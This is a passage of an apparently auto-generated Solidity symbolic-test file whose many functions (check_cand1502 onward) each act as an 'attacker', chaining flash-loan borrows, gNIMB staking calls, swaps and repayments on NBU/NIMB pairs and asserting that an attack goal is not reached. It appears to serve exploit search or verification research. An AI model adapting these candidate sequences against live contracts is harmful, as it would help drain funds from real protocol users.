        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1502(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1503(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1504(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1505(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1506(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1507(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1508(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1509(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1510(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1511(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1512(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1513(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1514(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1515(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1516(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1517(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1518(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1519(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1520(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1521(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1522(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1523(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1524(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1525(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1526(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1527(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1528(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1529(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1530(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1531(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1532(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1533(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1534(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1535(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1536(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1537(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1538(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1539(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1540(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1541(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1542(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1543(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1544(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1545(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1546(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1547(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1548(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1549(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1550(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1551(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1552(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1553(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
